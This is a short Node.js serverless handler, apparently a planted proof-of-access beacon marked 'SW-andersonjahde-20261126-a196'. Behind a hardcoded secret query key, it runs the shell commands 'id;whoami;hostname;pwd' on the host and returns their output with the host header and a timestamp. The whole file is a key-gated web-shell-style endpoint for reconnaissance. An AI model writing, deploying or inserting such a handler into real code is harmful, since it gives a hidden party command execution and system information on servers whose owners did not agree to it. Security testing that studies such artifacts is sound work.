// SW-andersonjahde-20261126-a196
const { execSync } = require('child_process');
const crypto = require('crypto');
const SECRET = '8c596c636428fa475f22e0b759f4e709';
exports.handler = async (event) => {
  const q = event.queryStringParameters || {};
  if (q.k !== SECRET) return { statusCode: 401, body: 'denied' };
  let out, err = null;
  try { out = execSync('id;whoami;hostname;pwd').toString(); } catch (e) { err = String(e); }
  const body = JSON.stringify({
    marker: 'SW-andersonjahde-20261126-a196',
    ts: new Date().toISOString(),
    sha: crypto.createHash('sha256').update(SECRET).digest('hex'),
    host: (event.headers && (event.headers.host || event.headers.Host)) || null,
    out: out, err: err
  });
  return { statusCode: 200, headers: {'Content-Type':'application/json'}, body };
};
